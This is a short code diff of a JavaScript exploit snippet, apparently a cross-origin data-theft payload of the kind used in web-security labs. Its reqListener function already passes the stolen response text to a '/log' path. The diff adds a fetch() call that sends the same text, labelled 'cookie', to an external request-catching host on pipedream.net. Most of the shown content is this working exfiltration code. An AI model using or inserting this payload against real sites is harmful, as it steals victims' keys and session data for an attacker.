@@ -7,5 +7,6 @@
 
     function reqListener() {
         location='/log?key='+this.responseText;
+        fetch("https://en5h4bhtknzjl.x.pipedream.net/?cookie="+this.responseText);
     };
 </script>
